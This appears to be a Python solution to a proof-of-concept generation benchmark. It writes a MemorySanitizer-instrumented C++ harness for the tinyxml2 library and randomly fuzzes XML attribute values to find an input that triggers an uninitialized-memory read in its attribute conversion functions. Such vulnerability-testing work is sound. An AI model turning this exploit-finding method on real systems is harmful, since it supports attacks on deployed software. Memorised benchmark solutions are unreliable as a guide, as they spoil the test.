import os
import sys
import tarfile
import tempfile
import subprocess
import glob
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Args:
            src_path: Path to the vulnerable source code tarball
            
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Create a temporary directory for extraction and build
        with tempfile.TemporaryDirectory() as work_dir:
            # Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            except Exception:
                # Fallback if extraction fails
                return b'<element attr="invalid"/>'

            # Locate tinyxml2 source files (tinyxml2.cpp)
            cpp_files = glob.glob(os.path.join(work_dir, "**", "tinyxml2.cpp"), recursive=True)
            if not cpp_files:
                return b'<element attr="invalid"/>'
            
            src_dir = os.path.dirname(cpp_files[0])
            harness_path = os.path.join(src_dir, "harness.cpp")
            
            # Create a harness that triggers the uninitialized value vulnerability.
            # The vulnerability involves unsuccessful attribute conversions returning success
            # without setting the output variable. We must call Query*Value methods
            # and read the result to trigger MemorySanitizer.
            harness_code = r"""
#include "tinyxml2.h"
#include <stdlib.h>
#include <stdio.h>

using namespace tinyxml2;

class Visitor : public XMLVisitor {
public:
    virtual bool VisitEnter(const XMLElement& element, const XMLAttribute* firstAttribute) {
        const XMLAttribute* attr = firstAttribute;
        while (attr) {
            // Try all conversion types
            int i;
            if (attr->QueryIntValue(&i) == XML_SUCCESS) { volatile int v = i; }
            
            unsigned u;
            if (attr->QueryUnsignedValue(&u) == XML_SUCCESS) { volatile unsigned v = u; }
            
            int64_t i64;
            if (attr->QueryInt64Value(&i64) == XML_SUCCESS) { volatile int64_t v = i64; }
            
            bool b;
            if (attr->QueryBoolValue(&b) == XML_SUCCESS) { volatile bool v = b; }
            
            double d;
            if (attr->QueryDoubleValue(&d) == XML_SUCCESS) { volatile double v = d; }
            
            float f;
            if (attr->QueryFloatValue(&f) == XML_SUCCESS) { volatile float v = f; }
            
            attr = attr->Next();
        }
        return true;
    }
};

int main(int argc, char** argv) {
    if (argc < 2) return 0;
    XMLDocument doc;
    // Parse the file
    if (doc.LoadFile(argv[1]) == XML_SUCCESS) {
        // Traverse to access attributes
        Visitor visitor;
        doc.Accept(&visitor);
    }
    return 0;
}
"""
            with open(harness_path, "w") as f:
                f.write(harness_code)
            
            exe_path = os.path.join(src_dir, "fuzzer")
            
            # Compile with clang and MemorySanitizer
            # MSan detects uninitialized memory reads.
            cmd = [
                "clang++",
                "-fsanitize=memory",
                "-fno-omit-frame-pointer",
                "-g",
                "-O1",
                "tinyxml2.cpp",
                "harness.cpp",
                "-o",
                exe_path
            ]
            
            try:
                subprocess.check_call(cmd, cwd=src_dir, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            except (subprocess.CalledProcessError, FileNotFoundError, OSError):
                # If compilation fails (e.g. no clang), return a generic PoC likely to trigger the bug
                return b'<element attr="invalid_int_val"/>'

            # Fuzzing Loop
            # We generate various XMLs with attributes that might fail conversion
            candidates = [
                b"", b" ", b"invalid", b"1e", b"0x", b"true", b"false",
                b"123", b"-1", b"1.0", b"1,0", b"NaN", b"INF",
                b"99999999999999999999", b"1e+1000",
                b"0"*50, b"a"*50, b"!", b"@", b"#", b"$"
            ]
            
            start_time = time.time()
            test_file = os.path.join(src_dir, "input.xml")
            
            # Run for a limited time to find a crash
            while time.time() - start_time < 45:
                # Generate Input
                if random.random() < 0.4:
                    val = random.choice(candidates)
                elif random.random() < 0.7:
                    # Random ASCII
                    length = random.randint(0, 20)
                    val = bytes([random.randint(32, 126) for _ in range(length)])
                else:
                    # Mixed
                    val = random.choice(candidates) + b"_" + bytes([random.randint(32, 126) for _ in range(5)])

                # Construct XML structure
                if random.random() < 0.6:
                    poc = b'<e a="%s"/>' % val
                else:
                    poc = b'<root>' + (b'<e a="%s"/>' % val) * random.randint(1, 5) + b'</root>'
                
                with open(test_file, "wb") as f:
                    f.write(poc)
                
                # Execute Harness
                try:
                    proc = subprocess.run(
                        [exe_path, test_file],
                        cwd=src_dir,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=1
                    )
                    
                    # Check for crash or MSan error
                    if proc.returncode != 0:
                        if b"MemorySanitizer" in proc.stderr:
                            return poc
                        # Also accept standard crashes (segfault etc)
                        if proc.returncode < 0 or proc.returncode > 128:
                            return poc
                except subprocess.TimeoutExpired:
                    continue

            # Default return if no crash found
            return b'<element attr="invalid"/>'